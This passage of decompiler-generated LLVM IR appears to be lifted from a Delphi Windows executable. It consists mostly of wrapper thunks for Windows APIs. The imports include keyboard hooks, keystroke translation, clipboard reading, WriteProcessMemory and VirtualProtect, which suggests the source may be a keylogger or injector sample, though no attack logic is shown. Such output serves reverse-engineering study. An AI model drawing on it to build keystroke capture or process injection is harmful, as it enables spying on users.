  %6 = icmp slt i32 %5, 1, !insn.addr !84
  br i1 %6, label %dec_label_pc_4036c6, label %dec_label_pc_4036c2, !insn.addr !84

dec_label_pc_4036c2:                              ; preds = %dec_label_pc_4036bc
  store i32 %5, i32* %3, align 4, !insn.addr !85
  br label %dec_label_pc_4036c6, !insn.addr !85

dec_label_pc_4036c6:                              ; preds = %dec_label_pc_4036c2, %dec_label_pc_4036bc, %dec_label_pc_4036b8
  ret i32 %0, !insn.addr !86
}

define i32 @function_4036c8() local_unnamed_addr {
dec_label_pc_4036c8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !87
  %spec.select = select i1 %1, i32 4208333, i32 %0
  ret i32 %spec.select, !insn.addr !88
}

declare i32 @InternalUniqueString() local_unnamed_addr

define i32 @UniqueString() local_unnamed_addr {
dec_label_pc_403718:
  %0 = call i32 @InternalUniqueString(), !insn.addr !89
  ret i32 %0, !insn.addr !89
}

define i32 @function_40371d() local_unnamed_addr {
dec_label_pc_40371d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !90
}

define i32 @function_403720() local_unnamed_addr {
dec_label_pc_403720:
  %0 = call i32 @InternalUniqueString(), !insn.addr !91
  ret i32 %0, !insn.addr !91
}

define i32 @function_403725() local_unnamed_addr {
dec_label_pc_403725:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !92
}

declare i32 @"@LStrCopy"() local_unnamed_addr

define i32 @function_403767() local_unnamed_addr {
dec_label_pc_403767:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !93
}

declare i32 @"@LStrDelete"() local_unnamed_addr

declare i32 @"@LStrInsert"() local_unnamed_addr

declare i32 @"@LStrPos"() local_unnamed_addr

declare i32 @"@LStrSetLength"() local_unnamed_addr

define i32 @function_4038bf() local_unnamed_addr {
dec_label_pc_4038bf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !94
}

define i32 @function_40396b() local_unnamed_addr {
dec_label_pc_40396b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !95
}

declare i32 @"@FinalizeArray"() local_unnamed_addr

define i32 @function_403a6f() local_unnamed_addr {
dec_label_pc_403a6f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !96
}

define i32 @function_403c7e() local_unnamed_addr {
dec_label_pc_403c7e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !97
}

define i32 @function_403c87() local_unnamed_addr {
dec_label_pc_403c87:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !98
}

define i32 @function_403c88() local_unnamed_addr {
dec_label_pc_403c88:
  %eax.0.reg2mem = alloca i32, !insn.addr !99
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !99
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !100
  br i1 %1, label %dec_label_pc_403c8f, label %dec_label_pc_403c8c, !insn.addr !100

dec_label_pc_403c8c:                              ; preds = %dec_label_pc_403c88
  %2 = add i32 %0, -4, !insn.addr !101
  %3 = inttoptr i32 %2 to i32*, !insn.addr !101
  %4 = load i32, i32* %3, align 4, !insn.addr !101
  store i32 %4, i32* %eax.0.reg2mem, !insn.addr !101
  br label %dec_label_pc_403c8f, !insn.addr !101

dec_label_pc_403c8f:                              ; preds = %dec_label_pc_403c8c, %dec_label_pc_403c88
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !102
}

define i32 @function_403c90() local_unnamed_addr {
dec_label_pc_403c90:
  %0 = call i32 @function_403c88(), !insn.addr !103
  %1 = add i32 %0, -1, !insn.addr !104
  ret i32 %1, !insn.addr !105
}

define i32 @FinalizeArray() local_unnamed_addr {
dec_label_pc_403ca8:
  %0 = call i32 @"@FinalizeArray"(), !insn.addr !106
  ret i32 %0, !insn.addr !106
}

define i32 @function_403cad() local_unnamed_addr {
dec_label_pc_403cad:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !107
}

define i32 @DynArrayClear() local_unnamed_addr {
dec_label_pc_403cb0:
  %0 = call i32 @"@DynArrayClear"(), !insn.addr !108
  ret i32 %0, !insn.addr !109
}

declare i32 @"@DynArraySetLength"() local_unnamed_addr

declare i32 @"@DynArrayClear"() local_unnamed_addr

declare i32 @RegisterModule() local_unnamed_addr

define i32 @UnregisterModule.47() local_unnamed_addr {
dec_label_pc_403f84:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !110
  ret i32 %0, !insn.addr !110
}

define i32 @function_403f89() local_unnamed_addr {
dec_label_pc_403f89:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !111
}

define i32 @function_403f8b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_403f8b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !112
}

define i32 @LCIDToCodePage.48() local_unnamed_addr {
dec_label_pc_40403a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !113
  ret i32 %0, !insn.addr !113
}

define i32 @function_40403f() local_unnamed_addr {
dec_label_pc_40403f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !114
}

define i32 @function_404041(i32 %arg1) local_unnamed_addr {
dec_label_pc_404041:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !115
}

define i32 @Finalization.49() local_unnamed_addr {
dec_label_pc_404092:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !116
  ret i32 %0, !insn.addr !116
}

define i32 @function_404097() local_unnamed_addr {
dec_label_pc_404097:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !117
}

define i32 @function_404099(i32 %arg1) local_unnamed_addr {
dec_label_pc_404099:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !118
}

define i32 @LocalAlloc.24() local_unnamed_addr {
dec_label_pc_404170:
  %0 = call i32 @LocalAlloc.3(), !insn.addr !119
  ret i32 %0, !insn.addr !119
}

define i32 @LocalFree.38() local_unnamed_addr {
dec_label_pc_404178:
  %0 = call i32 @LocalFree.2(), !insn.addr !120
  ret i32 %0, !insn.addr !120
}

define i32 @TlsAlloc.37() local_unnamed_addr {
dec_label_pc_404180:
  %0 = call i32 @TlsAlloc(), !insn.addr !121
  ret i32 %0, !insn.addr !121
}

define i1 @TlsFree.39(i32 %dwTlsIndex) local_unnamed_addr {
dec_label_pc_404188:
  %0 = call i1 @TlsFree(i32 %dwTlsIndex), !insn.addr !122
  ret i1 %0, !insn.addr !122
}

define i32* @TlsGetValue.22(i32 %dwTlsIndex) local_unnamed_addr {
dec_label_pc_404190:
  %0 = call i32* @TlsGetValue(i32 %dwTlsIndex), !insn.addr !123
  ret i32* %0, !insn.addr !123
}

define i1 @TlsSetValue.23(i32 %dwTlsIndex, i32* %lpTlsValue) local_unnamed_addr {
dec_label_pc_404198:
  %0 = call i1 @TlsSetValue(i32 %dwTlsIndex, i32* %lpTlsValue), !insn.addr !124
  ret i1 %0, !insn.addr !124
}

define i32 @GetTlsSize() local_unnamed_addr {
dec_label_pc_4041ac:
  ret i32 8, !insn.addr !125
}

define i32 @InitializeModule() local_unnamed_addr {
dec_label_pc_4042b0:
  %0 = call i32 @RegisterModule(), !insn.addr !126
  ret i32 %0, !insn.addr !127
}

declare i32 @"@InitLib"(i32) local_unnamed_addr

define i32 @function_404304() local_unnamed_addr {
dec_label_pc_404304:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !128
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !128
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !128
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !129
  %2 = load i32, i32* @global_var_409658, align 4, !insn.addr !130
  %3 = add i32 %2, 1, !insn.addr !130
  store i32 %3, i32* @global_var_409658, align 4, !insn.addr !130
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !131
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !132
  ret i32 0, !insn.addr !133
}

define i32 @function_404329() local_unnamed_addr {
dec_label_pc_404329:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !134
  ret i32 %0, !insn.addr !134
}

define i32 @function_40432e() local_unnamed_addr {
dec_label_pc_40432e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !135
}

define i32 @function_404330(i32 %arg1) local_unnamed_addr {
dec_label_pc_404330:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !136
}

define i32 @function_404334() local_unnamed_addr {
dec_label_pc_404334:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409658, align 4, !insn.addr !137
  %2 = add i32 %1, -1, !insn.addr !137
  store i32 %2, i32* @global_var_409658, align 4, !insn.addr !137
  ret i32 %0, !insn.addr !138
}

define i32 @function_40433c() local_unnamed_addr {
dec_label_pc_40433c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !139
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !139
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !139
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !140
  %2 = load i32, i32* @global_var_409660, align 4, !insn.addr !141
  %3 = add i32 %2, 1, !insn.addr !141
  store i32 %3, i32* @global_var_409660, align 4, !insn.addr !141
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !142
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !143
  ret i32 0, !insn.addr !144
}

define i32 @function_404361() local_unnamed_addr {
dec_label_pc_404361:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !145
  ret i32 %0, !insn.addr !145
}

define i32 @function_404366() local_unnamed_addr {
dec_label_pc_404366:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !146
}

define i32 @function_404368(i32 %arg1) local_unnamed_addr {
dec_label_pc_404368:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !147
}

define i32 @function_40436c() local_unnamed_addr {
dec_label_pc_40436c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409660, align 4, !insn.addr !148
  %2 = add i32 %1, -1, !insn.addr !148
  store i32 %2, i32* @global_var_409660, align 4, !insn.addr !148
  ret i32 %0, !insn.addr !149
}

define i32 @function_404374() local_unnamed_addr {
dec_label_pc_404374:
  %0 = call i32 @RegCloseKey.6(), !insn.addr !150
  ret i32 %0, !insn.addr !150
}

define i32 @function_40437c(i32* %hKey, i8* %lpSubKey, i32 %Reserved, i8* %lpClass, i32 %dwOptions, i32 %samDesired, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32** %phkResult, i32* %lpdwDisposition) local_unnamed_addr {
dec_label_pc_40437c:
  %0 = call i32 @RegCreateKeyExA(i32* %hKey, i8* %lpSubKey, i32 %Reserved, i8* %lpClass, i32 %dwOptions, i32 %samDesired, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32** %phkResult, i32* %lpdwDisposition), !insn.addr !151
  ret i32 %0, !insn.addr !151
}

define i32 @function_404384(i32* %hKey, i8* %lpSubKey) local_unnamed_addr {
dec_label_pc_404384:
  %0 = call i32 @RegDeleteKeyA(i32* %hKey, i8* %lpSubKey), !insn.addr !152
  ret i32 %0, !insn.addr !152
}

define i32 @function_40438c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i8* %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_40438c:
  %0 = call i32 @RegOpenKeyExA.5(), !insn.addr !153
  ret i32 %0, !insn.addr !153
}

define i32 @function_404394(i32 %arg1, i32* %arg2, i32* %arg3, i32* %arg4, i32 %arg5, i8* %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_404394:
  %0 = call i32 @RegQueryValueExA.4(), !insn.addr !154
  ret i32 %0, !insn.addr !154
}

define i32 @function_40439c(i32* %hKey, i8* %lpValueName, i32 %Reserved, i32 %dwType, i8* %lpData, i32 %cbData) local_unnamed_addr {
dec_label_pc_40439c:
  %0 = call i32 @RegSetValueExA(i32* %hKey, i8* %lpValueName, i32 %Reserved, i32 %dwType, i8* %lpData, i32 %cbData), !insn.addr !155
  ret i32 %0, !insn.addr !155
}

define i1 @function_4043a4(i32* %hObject) local_unnamed_addr {
dec_label_pc_4043a4:
  %0 = call i1 @CloseHandle(i32* %hObject), !insn.addr !156
  ret i1 %0, !insn.addr !156
}

define i32 @function_4043ac(i32 %Locale, i32 %dwCmpFlags, i8* %lpString1, i32 %cchCount1, i8* %lpString2, i32 %cchCount2) local_unnamed_addr {
dec_label_pc_4043ac:
  %0 = call i32 @CompareStringA(i32 %Locale, i32 %dwCmpFlags, i8* %lpString1, i32 %cchCount1, i8* %lpString2, i32 %cchCount2), !insn.addr !157
  ret i32 %0, !insn.addr !157
}

define i1 @function_4043b4(i8* %lpExistingFileName, i8* %lpNewFileName, i1 %bFailIfExists) local_unnamed_addr {
dec_label_pc_4043b4:
  %0 = call i1 @CopyFileA(i8* %lpExistingFileName, i8* %lpNewFileName, i1 %bFailIfExists), !insn.addr !158
  ret i1 %0, !insn.addr !158
}

define i32* @function_4043bc(i8* %lpFileName, i32 %dwDesiredAccess, i32 %dwShareMode, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32 %dwCreationDisposition, i32 %dwFlagsAndAttributes, i32* %hTemplateFile) local_unnamed_addr {
dec_label_pc_4043bc:
  %0 = call i32* @CreateFileA(i8* %lpFileName, i32 %dwDesiredAccess, i32 %dwShareMode, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32 %dwCreationDisposition, i32 %dwFlagsAndAttributes, i32* %hTemplateFile), !insn.addr !159
  ret i32* %0, !insn.addr !159
}

define i32* @function_4043c4(%_SECURITY_ATTRIBUTES* %lpThreadAttributes, i32 %dwStackSize, i32 (i32*)* %lpStartAddress, i32* %lpParameter, i32 %dwCreationFlags, i32* %lpThreadId) local_unnamed_addr {
dec_label_pc_4043c4:
  %0 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* %lpThreadAttributes, i32 %dwStackSize, i32 (i32*)* %lpStartAddress, i32* %lpParameter, i32 %dwCreationFlags, i32* %lpThreadId), !insn.addr !160
  ret i32* %0, !insn.addr !160
}

define i1 @function_4043cc(i8* %lpFileName) local_unnamed_addr {
dec_label_pc_4043cc:
  %0 = call i1 @DeleteFileA(i8* %lpFileName), !insn.addr !161
  ret i1 %0, !insn.addr !161
}

define i32 @function_4043d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_4043d4:
  %0 = call i32 @ExitProcess.9(), !insn.addr !162
  ret i32 %0, !insn.addr !162
}

define i32* @function_4043dc(i32* %hModule, i8* %lpName, i8* %lpType) local_unnamed_addr {
dec_label_pc_4043dc:
  %0 = call i32* @FindResourceA(i32* %hModule, i8* %lpName, i8* %lpType), !insn.addr !163
  ret i32* %0, !insn.addr !163
}

define void @function_4043e4(i32* %hLibModule, i32 %dwExitCode) local_unnamed_addr {
dec_label_pc_4043e4:
  call void @FreeLibraryAndExitThread(i32* %hLibModule, i32 %dwExitCode), !insn.addr !164
  ret void, !insn.addr !164
}

define i32* @function_4043ec() local_unnamed_addr {
dec_label_pc_4043ec:
  %0 = call i32* @GetCurrentProcess(), !insn.addr !165
  ret i32* %0, !insn.addr !165
}

define i32 @function_4043f4(i32* %hFile, i32* %lpFileSizeHigh) local_unnamed_addr {
dec_label_pc_4043f4:
  %0 = call i32 @GetFileSize(i32* %hFile, i32* %lpFileSizeHigh), !insn.addr !166
  ret i32 %0, !insn.addr !166
}

define i32 @function_4043fc(i32* %hModule, i8* %lpFilename, i32 %nSize) local_unnamed_addr {
dec_label_pc_4043fc:
  %0 = call i32 @GetModuleFileNameA(i32* %hModule, i8* %lpFilename, i32 %nSize), !insn.addr !167
  ret i32 %0, !insn.addr !167
}

define i32* @function_404404(i8* %lpModuleName) local_unnamed_addr {
dec_label_pc_404404:
  %0 = call i32* @GetModuleHandleA(i8* %lpModuleName), !insn.addr !168
  ret i32* %0, !insn.addr !168
}

define i32 ()* @function_40440c(i32* %hModule, i8* %lpProcName) local_unnamed_addr {
dec_label_pc_40440c:
  %0 = call i32 ()* @GetProcAddress(i32* %hModule, i8* %lpProcName), !insn.addr !169
  ret i32 ()* %0, !insn.addr !169
}

define i32 @function_404414(i32 %nBufferLength, i8* %lpBuffer) local_unnamed_addr {
dec_label_pc_404414:
  %0 = call i32 @GetTempPathA(i32 %nBufferLength, i8* %lpBuffer), !insn.addr !170
  ret i32 %0, !insn.addr !170
}

define i32 @function_40441c() local_unnamed_addr {
dec_label_pc_40441c:
  %0 = call i32 @GetTickCount.8(), !insn.addr !171
  ret i32 %0, !insn.addr !171
}

define i32* @function_404424(i32 %uFlags, i32 %dwBytes) local_unnamed_addr {
dec_label_pc_404424:
  %0 = call i32* @GlobalAlloc(i32 %uFlags, i32 %dwBytes), !insn.addr !172
  ret i32* %0, !insn.addr !172
}

define i32* @function_40442c(i32* %hMem) local_unnamed_addr {
dec_label_pc_40442c:
  %0 = call i32* @GlobalFree(i32* %hMem), !insn.addr !173
  ret i32* %0, !insn.addr !173
}

define i32* @function_404434(i32* %hMem) local_unnamed_addr {
dec_label_pc_404434:
  %0 = call i32* @GlobalLock(i32* %hMem), !insn.addr !174
  ret i32* %0, !insn.addr !174
}

define i1 @function_40443c(i32* %hMem) local_unnamed_addr {
dec_label_pc_40443c:
  %0 = call i1 @GlobalUnlock(i32* %hMem), !insn.addr !175
  ret i1 %0, !insn.addr !175
}

define i32* @function_404444(i8* %lpLibFileName) local_unnamed_addr {
dec_label_pc_404444:
  %0 = call i32* @LoadLibraryA(i8* %lpLibFileName), !insn.addr !176
  ret i32* %0, !insn.addr !176
}

define i1 @function_40444c(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToRead, i32* %lpNumberOfBytesRead, %_OVERLAPPED* %lpOverlapped) local_unnamed_addr {
dec_label_pc_40444c:
  %0 = call i1 @ReadFile(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToRead, i32* %lpNumberOfBytesRead, %_OVERLAPPED* %lpOverlapped), !insn.addr !177
  ret i1 %0, !insn.addr !177
}

define i1 @function_404454(i32* %hFile) local_unnamed_addr {
dec_label_pc_404454:
  %0 = call i1 @SetEndOfFile(i32* %hFile), !insn.addr !178
  ret i1 %0, !insn.addr !178
}

define void @function_40445c(i32 %dwMilliseconds) local_unnamed_addr {
dec_label_pc_40445c:
  call void @Sleep(i32 %dwMilliseconds), !insn.addr !179
  ret void, !insn.addr !179
}

define i1 @function_404464(i32* %lpAddress, i32 %dwSize, i32 %flNewProtect, i32* %lpflOldProtect) local_unnamed_addr {
dec_label_pc_404464:
  %0 = call i1 @VirtualProtect(i32* %lpAddress, i32 %dwSize, i32 %flNewProtect, i32* %lpflOldProtect), !insn.addr !180
  ret i1 %0, !insn.addr !180
}

define i32 @function_40446c() local_unnamed_addr {
dec_label_pc_40446c:
  %0 = call i32 @WriteFile.7(), !insn.addr !181
  ret i32 %0, !insn.addr !181
}

define i1 @function_404474(i32* %hProcess, i32* %lpBaseAddress, i32* %lpBuffer, i32 %nSize, i32* %lpNumberOfBytesWritten) local_unnamed_addr {
dec_label_pc_404474:
  %0 = call i1 @WriteProcessMemory(i32* %hProcess, i32* %lpBaseAddress, i32* %lpBuffer, i32 %nSize, i32* %lpNumberOfBytesWritten), !insn.addr !182
  ret i1 %0, !insn.addr !182
}

define i32 @function_40447c(i8* %lpString1, i8* %lpString2) local_unnamed_addr {
dec_label_pc_40447c:
  %0 = call i32 @lstrcmpiA(i8* %lpString1, i8* %lpString2), !insn.addr !183
  ret i32 %0, !insn.addr !183
}

define i8* @function_404484(i8* %lpString1, i8* %lpString2) local_unnamed_addr {
dec_label_pc_404484:
  %0 = call i8* @lstrcpyA(i8* %lpString1, i8* %lpString2), !insn.addr !184
  ret i8* %0, !insn.addr !184
}

define i1 @function_40448c(i32* %hdc, i32 %iFirst, i32 %iLast, i32* %lpBuffer) local_unnamed_addr {
dec_label_pc_40448c:
  %0 = call i1 @GetCharWidthA(i32* %hdc, i32 %iFirst, i32 %iLast, i32* %lpBuffer), !insn.addr !185
  ret i1 %0, !insn.addr !185
}

define i32* @function_404494(i32 %i) local_unnamed_addr {
dec_label_pc_404494:
  %0 = call i32* @GetStockObject(i32 %i), !insn.addr !186
  ret i32* %0, !insn.addr !186
}

define i32* @function_40449c(i32* %hdc, i32* %h) local_unnamed_addr {
dec_label_pc_40449c:
  %0 = call i32* @SelectObject(i32* %hdc, i32* %h), !insn.addr !187
  ret i32* %0, !insn.addr !187
}

define i32 @function_4044a4(i32* %hhk, i32 %nCode, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044a4:
  %0 = call i32 @CallNextHookEx(i32* %hhk, i32 %nCode, i32 %wParam, i32 %lParam), !insn.addr !188
  ret i32 %0, !insn.addr !188
}

define i1 @function_4044ac() local_unnamed_addr {
dec_label_pc_4044ac:
  %0 = call i1 @CloseClipboard(), !insn.addr !189
  ret i1 %0, !insn.addr !189
}

define i32 @function_4044b4(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044b4:
  %0 = call i32 @DefWindowProcA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !190
  ret i32 %0, !insn.addr !190
}

define i32 @function_4044bc(%tagMSG* %lpMsg) local_unnamed_addr {
dec_label_pc_4044bc:
  %0 = call i32 @DispatchMessageA(%tagMSG* %lpMsg), !insn.addr !191
  ret i32 %0, !insn.addr !191
}

define i1 @function_4044c4(i1 (i32*, i32)* %lpEnumFunc, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044c4:
  %0 = call i1 @EnumWindows(i1 (i32*, i32)* %lpEnumFunc, i32 %lParam), !insn.addr !192
  ret i1 %0, !insn.addr !192
}

define i32* @function_4044cc(i8* %lpClassName, i8* %lpWindowName) local_unnamed_addr {
dec_label_pc_4044cc:
  %0 = call i32* @FindWindowA(i8* %lpClassName, i8* %lpWindowName), !insn.addr !193
  ret i32* %0, !insn.addr !193
}

define i32* @function_4044d4(i32* %hWndParent, i32* %hWndChildAfter, i8* %lpszClass, i8* %lpszWindow) local_unnamed_addr {
dec_label_pc_4044d4:
  %0 = call i32* @FindWindowExA(i32* %hWndParent, i32* %hWndChildAfter, i8* %lpszClass, i8* %lpszWindow), !insn.addr !194
  ret i32* %0, !insn.addr !194
}

define i1 @function_4044dc(%tagPOINT* %lpPoint) local_unnamed_addr {
dec_label_pc_4044dc:
  %0 = call i1 @GetCaretPos(%tagPOINT* %lpPoint), !insn.addr !195
  ret i1 %0, !insn.addr !195
}

define i32 @function_4044e4(i32* %hWnd, i32 %nIndex) local_unnamed_addr {
dec_label_pc_4044e4:
  %0 = call i32 @GetClassLongA(i32* %hWnd, i32 %nIndex), !insn.addr !196
  ret i32 %0, !insn.addr !196
}

define i32 @function_4044ec(i32* %hWnd, i8* %lpClassName, i32 %nMaxCount) local_unnamed_addr {
dec_label_pc_4044ec:
  %0 = call i32 @GetClassNameA(i32* %hWnd, i8* %lpClassName, i32 %nMaxCount), !insn.addr !197
  ret i32 %0, !insn.addr !197
}

define i32* @function_4044f4(i32 %uFormat) local_unnamed_addr {
dec_label_pc_4044f4:
  %0 = call i32* @GetClipboardData(i32 %uFormat), !insn.addr !198
  ret i32* %0, !insn.addr !198
}

define i32* @function_4044fc(i32* %hWnd) local_unnamed_addr {
dec_label_pc_4044fc:
  %0 = call i32* @GetDC(i32* %hWnd), !insn.addr !199
  ret i32* %0, !insn.addr !199
}

define i1 @function_404504(i8* %lpKeyState) local_unnamed_addr {
dec_label_pc_404504:
  %0 = call i1 @GetKeyboardState(i8* %lpKeyState), !insn.addr !200
  ret i1 %0, !insn.addr !200
}

define i1 @function_40450c(%tagMSG* %lpMsg, i32* %hWnd, i32 %wMsgFilterMin, i32 %wMsgFilterMax) local_unnamed_addr {
dec_label_pc_40450c:
  %0 = call i1 @GetMessageA(%tagMSG* %lpMsg, i32* %hWnd, i32 %wMsgFilterMin, i32 %wMsgFilterMax), !insn.addr !201
  ret i1 %0, !insn.addr !201
}

define i32* @function_404514(i32* %hWnd) local_unnamed_addr {
dec_label_pc_404514:
  %0 = call i32* @GetParent(i32* %hWnd), !insn.addr !202
  ret i32* %0, !insn.addr !202
}

define i32* @function_40451c(i32* %hWnd) local_unnamed_addr {
dec_label_pc_40451c:
  %0 = call i32* @GetTopWindow(i32* %hWnd), !insn.addr !203
  ret i32* %0, !insn.addr !203
}

define i32* @function_404524(i32* %hWnd, i32 %uCmd) local_unnamed_addr {
dec_label_pc_404524:
  %0 = call i32* @GetWindow(i32* %hWnd, i32 %uCmd), !insn.addr !204
  ret i32* %0, !insn.addr !204
}

define i32 @function_40452c(i32* %hWnd, i32 %nIndex) local_unnamed_addr {
dec_label_pc_40452c:
  %0 = call i32 @GetWindowLongA(i32* %hWnd, i32 %nIndex), !insn.addr !205
  ret i32 %0, !insn.addr !205
}

define i32 @function_404534(i32* %hWnd, i32* %lpdwProcessId) local_unnamed_addr {
dec_label_pc_404534:
  %0 = call i32 @GetWindowThreadProcessId(i32* %hWnd, i32* %lpdwProcessId), !insn.addr !206
  ret i32 %0, !insn.addr !206
}

define i1 @function_40453c(i32* %hWnd) local_unnamed_addr {
dec_label_pc_40453c:
  %0 = call i1 @IsWindow(i32* %hWnd), !insn.addr !207
  ret i1 %0, !insn.addr !207
}

define i1 @function_404544(i32* %hWnd) local_unnamed_addr {
dec_label_pc_404544:
  %0 = call i1 @IsWindowVisible(i32* %hWnd), !insn.addr !208
  ret i1 %0, !insn.addr !208
}

define i1 @TObject.AfterConstruction(i32* %hWnd, i32 %uIDEvent) local_unnamed_addr {
dec_label_pc_40454c:
  %0 = call i1 @KillTimer(i32* %hWnd, i32 %uIDEvent), !insn.addr !209
  ret i1 %0, !insn.addr !209
}

define i32* @function_404554(i32* %hInstance, i8* %lpIconName) local_unnamed_addr {
dec_label_pc_404554:
  %0 = call i32* @LoadIconA(i32* %hInstance, i8* %lpIconName), !insn.addr !210
  ret i32* %0, !insn.addr !210
}

define i1 @function_40455c(i32* %hWndNewOwner) local_unnamed_addr {
dec_label_pc_40455c:
  %0 = call i1 @OpenClipboard(i32* %hWndNewOwner), !insn.addr !211
  ret i1 %0, !insn.addr !211
}

define i1 @function_404564(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_404564:
  %0 = call i1 @PostMessageA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !212
  ret i1 %0, !insn.addr !212
}

define void @function_40456c(i32 %nExitCode) local_unnamed_addr {
dec_label_pc_40456c:
  call void @PostQuitMessage(i32 %nExitCode), !insn.addr !213
  ret void, !insn.addr !213
}

define i32 @function_404574(i32* %hWnd, i32* %hDC) local_unnamed_addr {
dec_label_pc_404574:
  %0 = call i32 @ReleaseDC(i32* %hWnd, i32* %hDC), !insn.addr !214
  ret i32 %0, !insn.addr !214
}

define i32 @function_40457c(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_40457c:
  %0 = call i32 @SendMessageA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !215
  ret i32 %0, !insn.addr !215
}

define i32 @function_404584(i32* %hWnd, i32 %nIDEvent, i32 %uElapse, void (i32*, i32, i32, i32)* %lpTimerFunc) local_unnamed_addr {
dec_label_pc_404584:
  %0 = call i32 @SetTimer(i32* %hWnd, i32 %nIDEvent, i32 %uElapse, void (i32*, i32, i32, i32)* %lpTimerFunc), !insn.addr !216
  ret i32 %0, !insn.addr !216
}

define i32 @function_40458c(i32* %hWnd, i32 %nIndex, i32 %dwNewLong) local_unnamed_addr {
dec_label_pc_40458c:
  %0 = call i32 @SetWindowLongA(i32* %hWnd, i32 %nIndex, i32 %dwNewLong), !insn.addr !217
  ret i32 %0, !insn.addr !217
}

define i32* @function_404594(i32 %idHook, i32 (i32, i32, i32)* %lpfn, i32* %hmod, i32 %dwThreadId) local_unnamed_addr {
dec_label_pc_404594:
  %0 = call i32* @SetWindowsHookExA(i32 %idHook, i32 (i32, i32, i32)* %lpfn, i32* %hmod, i32 %dwThreadId), !insn.addr !218
  ret i32* %0, !insn.addr !218
}

define i32 @function_40459c(i32 %uVirtKey, i32 %uScanCode, i8* %lpKeyState, i16* %lpChar, i32 %uFlags) local_unnamed_addr {
dec_label_pc_40459c:
  %0 = call i32 @ToAscii(i32 %uVirtKey, i32 %uScanCode, i8* %lpKeyState, i16* %lpChar, i32 %uFlags), !insn.addr !219
  ret i32 %0, !insn.addr !219
}

define i1 @function_4045a4(i32* %hhk) local_unnamed_addr {
dec_label_pc_4045a4:
  %0 = call i1 @UnhookWindowsHookEx(i32* %hhk), !insn.addr !220
  ret i1 %0, !insn.addr !220
}

define i32 @function_4045ac() local_unnamed_addr {
dec_label_pc_4045ac:
  %0 = call i32 @Move(), !insn.addr !221
  ret i32 %0, !insn.addr !222
}

define i32 @_CreateWindowExA() local_unnamed_addr {
dec_label_pc_4045b4:
  %0 = call i32 @CreateWindowExA.10(), !insn.addr !223
  ret i32 %0, !insn.addr !223
}

